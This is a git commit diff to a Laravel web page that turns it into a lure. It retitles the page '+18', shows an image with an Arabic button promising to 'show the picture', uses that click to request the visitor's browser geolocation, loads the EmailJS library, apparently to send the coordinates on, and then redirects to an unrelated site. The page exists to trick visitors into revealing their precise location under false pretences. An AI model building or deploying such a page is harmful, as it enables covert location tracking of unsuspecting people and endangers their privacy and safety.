183e04f4ef554096f91655c559877fe84ae26400
Mohamad Elhadidy <elhadidy384@gmail.com>
2024-03-18 12:45:02 +0200

    g

--- resources/views/welcome.blade.php
+++ resources/views/welcome.blade.php
@@ -4,40 +4,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web</title>
+    <title>+18</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
 <body>
     <!-- Message for mobile users -->
-    <div id="mobileMessage" style="display: none; text-align: center;">
-        <button onclick="askForLocation()">Enable Location</button>
+    <div class="h-full h-screen  flex justify-center items-center flex-col">
+        <img src="/18.jpg" width="300" height="300" />
+        <button onclick="askForLocation()"
+            class="mt-10 bg-black font-bold text-white border rounded-lg p-2 hover:bg-white hover:text-black hover:border-black border-white ">عرض
+            الصوره</button>
+
     </div>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        window.onload = function() {
-            getLocation();
-        };
+        // window.onload = function() {
+        //     getLocation();
+        // };
 
         function getLocation() {
             if (navigator.geolocation) {
-                if (isMobileDevice()) {
-                    document.getElementById("mobileMessage").style.display = "block";
-                } else {
-                    // For other devices, ask for location automatically
-                    navigator.geolocation.getCurrentPosition(showPosition, showError);
-                    document.getElementById("mobileMessage").style.display =
-                    "none"; // Hide the button after asking for location
-                }
+
+                // For other devices, ask for location automatically
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+
             }
         }
 
-        function isMobileDevice() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
+
 
         function askForLocation() {
             navigator.geolocation.getCurrentPosition(showPosition, showError);
-            document.getElementById("mobileMessage").style.display = "none"; // Hide the button after asking for location
         }
 
         function showPosition(position) {
@@ -62,9 +60,9 @@
             // Check if the user's location meets the criteria for access
             // Example: Check if latitude is within a certain range
 
-            alert("Access granted. Welcome to the site!");
+            alert("عرض الصوره ");
             // Redirect the user to the site or load site content
-            // window.location.href = "https://www.yoursite.com";
+            window.location.href = "https://countriesinformation.com/";
 
         }
 
